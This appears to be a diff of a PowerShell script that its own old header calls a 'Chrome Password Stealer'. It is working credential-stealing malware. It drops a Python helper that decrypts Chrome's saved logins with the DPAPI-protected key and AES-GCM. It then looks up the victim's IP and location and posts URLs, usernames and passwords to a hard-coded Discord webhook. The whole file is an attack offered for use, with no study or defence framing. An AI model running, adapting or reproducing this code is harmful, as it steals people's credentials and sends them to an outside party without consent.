@@ -1,181 +1,168 @@
-# BARE MINIMUM Chrome Password Stealer - Visible, No Auto-Close
+# Chrome Password Extractor - Using Python for Decryption
 
 Write-Host "=== Chrome Password Extractor ===" -ForegroundColor Cyan
 Write-Host ""
 
-# Find Chrome database - check all possible profile locations
-Write-Host "Searching for Chrome profiles..." -ForegroundColor Yellow
+# Create Python decryption script
+$pythonScript = @'
+import sys
+import json
+import base64
+import sqlite3
+import shutil
+import os
+from Crypto.Cipher import AES
 
-$chromeUserData = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
+# Get key
+local_state = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+with open(local_state, "r", encoding="utf-8") as f:
+    state = json.loads(f.read())
 
-if (-not (Test-Path $chromeUserData)) {
-    Write-Host "ERROR: Chrome User Data folder not found!" -ForegroundColor Red
-    Write-Host "Path checked: $chromeUserData"
-    Read-Host "Press Enter to exit"
-    exit
-}
+encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
 
-# List all profiles
-$profiles = Get-ChildItem $chromeUserData -Directory | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
+import win32crypt
+key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
-Write-Host "Found $($profiles.Count) profile(s):" -ForegroundColor Green
-foreach ($profile in $profiles) {
-    Write-Host "  - $($profile.Name)"
-}
+# Copy database
+db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
+temp_db = os.path.join(os.environ["TEMP"], "chrome_temp.db")
+shutil.copyfile(db_path, temp_db)
 
-# Find Login Data in any profile
-$dbPath = $null
+# Query
+conn = sqlite3.connect(temp_db)
+cursor = conn.cursor()
+cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
 
-foreach ($profile in $profiles) {
-    $testPath = Join-Path $profile.FullName "Login Data"
-    if (Test-Path $testPath) {
-        $dbPath = $testPath
-        Write-Host "`nUsing profile: $($profile.Name)" -ForegroundColor Green
-        break
-    }
-}
-
-if (-not $dbPath) {
-    Write-Host "`nERROR: No 'Login Data' file found in any profile!" -ForegroundColor Red
-    Write-Host "`nChecked these locations:"
-    foreach ($profile in $profiles) {
-        Write-Host "  - $($profile.FullName)\Login Data"
-    }
-    Read-Host "Press Enter to exit"
-    exit
-}
-
-Write-Host "Database found: $dbPath" -ForegroundColor Green
-
-# Try to copy it
-$tempDb = "$env:TEMP\chrome_copy.db"
-
-Write-Host ""
-Write-Host "Copying database..." -ForegroundColor Yellow
-
-try {
-    Copy-Item $dbPath $tempDb -Force
-    Write-Host "Copy successful!" -ForegroundColor Green
-} catch {
-    Write-Host "ERROR: Cannot copy - Chrome might be running!" -ForegroundColor Red
-    Write-Host "Error: $($_.Exception.Message)"
-    Read-Host "Press Enter to exit"
-    exit
-}
-
-# Install PSSQLite if needed
-Write-Host ""
-Write-Host "Checking PSSQLite module..." -ForegroundColor Yellow
-
-if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
-    Write-Host "Installing PSSQLite..." -ForegroundColor Yellow
-    Install-Module PSSQLite -Force -Scope CurrentUser -SkipPublisherCheck
-}
-
-Import-Module PSSQLite
-Write-Host "PSSQLite loaded!" -ForegroundColor Green
-
-# Query database
-Write-Host ""
-Write-Host "Querying database..." -ForegroundColor Yellow
-
-$query = "SELECT origin_url, username_value, password_value FROM logins LIMIT 10"
-
-try {
-    $results = Invoke-SqliteQuery -DataSource $tempDb -Query $query
-    Write-Host "Found $($results.Count) entries!" -ForegroundColor Green
-} catch {
-    Write-Host "ERROR: Query failed!" -ForegroundColor Red
-    Write-Host "Error: $($_.Exception.Message)"
-    Remove-Item $tempDb -Force
-    Read-Host "Press Enter to exit"
-    exit
-}
-
-# Get encryption key
-Write-Host ""
-Write-Host "Getting encryption key..." -ForegroundColor Yellow
-
-$localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
-
-if (-not (Test-Path $localStatePath)) {
-    Write-Host "ERROR: Local State not found!" -ForegroundColor Red
-    Read-Host "Press Enter to exit"
-    exit
-}
-
-Add-Type -AssemblyName System.Security
-
-$localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
-$encryptedKeyB64 = $localState.os_crypt.encrypted_key
-$encryptedKey = [Convert]::FromBase64String($encryptedKeyB64)
-$encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
-
-$key = [Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
-
-Write-Host "Encryption key obtained! Length: $($key.Length) bytes" -ForegroundColor Green
-
-# Try to decrypt passwords
-Write-Host ""
-Write-Host "Decrypting passwords..." -ForegroundColor Yellow
-Write-Host ""
-
-$decrypted = 0
-
-foreach ($row in $results) {
-    $url = $row.origin_url
-    $username = $row.username_value
-    $encPass = [byte[]]$row.password_value
+results = []
+for row in cursor.fetchall():
+    url, username, enc_pass = row
     
-    if (-not $encPass -or $encPass.Length -eq 0) {
+    if not enc_pass:
         continue
+    
+    # Decrypt
+    try:
+        if enc_pass[:3] == b'v10' or enc_pass[:3] == b'v20':
+            # AES-GCM
+            nonce = enc_pass[3:15]
+            ciphertext = enc_pass[15:-16]
+            tag = enc_pass[-16:]
+            
+            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+            password = cipher.decrypt_and_verify(ciphertext, tag).decode()
+        else:
+            # Old DPAPI
+            password = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode()
+        
+        results.append({
+            "url": url,
+            "username": username,
+            "password": password
+        })
+    except Exception as e:
+        pass
+
+cursor.close()
+conn.close()
+os.remove(temp_db)
+
+# Output as JSON
+print(json.dumps(results, indent=2))
+'@
+
+$scriptPath = "$env:TEMP\decrypt_chrome.py"
+$pythonScript | Out-File $scriptPath -Encoding UTF8
+
+Write-Host "Installing Python dependencies..." -ForegroundColor Yellow
+python -m pip install pycryptodome pywin32 --quiet 2>&1 | Out-Null
+
+Write-Host "Running Python decryptor..." -ForegroundColor Yellow
+Write-Host ""
+
+$output = python $scriptPath 2>&1 | Out-String
+
+if ($output -match "Traceback") {
+    Write-Host "Python error:" -ForegroundColor Red
+    Write-Host $output
+    Remove-Item $scriptPath
+    Read-Host "Press Enter to exit"
+    exit
+}
+
+# Parse results
+try {
+    $passwords = $output | ConvertFrom-Json
+    
+    Write-Host "========================================" -ForegroundColor Green
+    Write-Host "Successfully extracted $($passwords.Count) passwords!" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Green
+    Write-Host ""
+    
+    foreach ($p in $passwords) {
+        Write-Host "URL: $($p.url)" -ForegroundColor Cyan
+        Write-Host "  Username: $($p.username)" -ForegroundColor White
+        Write-Host "  Password: $($p.password)" -ForegroundColor Green
+        Write-Host ""
     }
     
-    Write-Host "URL: $url" -ForegroundColor Cyan
-    Write-Host "  Username: $username"
-    Write-Host "  Encrypted length: $($encPass.Length) bytes"
-    Write-Host "  First 3 bytes: $($encPass[0]), $($encPass[1]), $($encPass[2])"
+    # Save to file
+    $outFile = "$env:USERPROFILE\Desktop\chrome_passwords.txt"
+    $passwords | ConvertTo-Json | Out-File $outFile
+    Write-Host "Saved to: $outFile" -ForegroundColor Cyan
+    
+    # Send to Discord
+    Write-Host ""
+    Write-Host "Sending to Discord..." -ForegroundColor Yellow
+    
+    $user = $env:USERNAME
+    $computer = $env:COMPUTERNAME
+    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     
     try {
-        # Check if v10/v11 (starts with 'v')
-        if ($encPass[0] -eq 118) {
-            Write-Host "  Encryption: AES-GCM (v10+)" -ForegroundColor Yellow
-            
-            $nonce = $encPass[3..14]
-            $ciphertext = $encPass[15..($encPass.Length - 17)]
-            $tag = $encPass[($encPass.Length - 16)..($encPass.Length - 1)]
-            
-            $aes = [Security.Cryptography.AesGcm]::new($key)
-            $plaintext = New-Object byte[] $ciphertext.Length
-            
-            $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
-            
-            $password = [Text.Encoding]::UTF8.GetString($plaintext)
-            
-            Write-Host "  Password: $password" -ForegroundColor Green
-            $decrypted++
-        } else {
-            Write-Host "  Encryption: DPAPI (old)" -ForegroundColor Yellow
-            
-            $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
-            $password = [Text.Encoding]::UTF8.GetString($decryptedBytes)
-            
-            Write-Host "  Password: $password" -ForegroundColor Green
-            $decrypted++
-        }
+        $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
+        $ip = $ipInfo.query
+        $city = $ipInfo.city
+        $country = $ipInfo.country
     } catch {
-        Write-Host "  FAILED: $($_.Exception.Message)" -ForegroundColor Red
+        $ip = "Unknown"
+        $city = "Unknown"
+        $country = "Unknown"
     }
     
-    Write-Host ""
+    $passText = ""
+    $max = [Math]::Min($passwords.Count, 20)
+    
+    for ($i = 0; $i -lt $max; $i++) {
+        $p = $passwords[$i]
+        $passText += "`n**$($p.url)**`nUser: ``$($p.username)```nPass: ``$($p.password)```n"
+    }
+    
+    if ($passwords.Count -gt 20) {
+        $passText += "`n... +$($passwords.Count - 20) more"
+    }
+    
+    $message = @"
+**🚨 New Connection**
+:clock1: $time
+:computer: $computer | $user
+:globe_with_meridians: $ip - $city, $country
+
+**🔐 Chrome Passwords ($($passwords.Count)):**$passText
+"@
+    
+    $webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"
+    
+    if ($message.Length -gt 1900) {
+        $message = $message.Substring(0, 1900)
+    }
+    
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message}|ConvertTo-Json) -ContentType "application/json"
+    Write-Host "Sent to Discord!" -ForegroundColor Green
+    
+} catch {
+    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
 }
 
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "Successfully decrypted: $decrypted passwords" -ForegroundColor Green
-Write-Host "========================================" -ForegroundColor Cyan
-
-# Cleanup
-Remove-Item $tempDb -Force
-
+Remove-Item $scriptPath
 Write-Host ""
 Read-Host "Press Enter to exit"
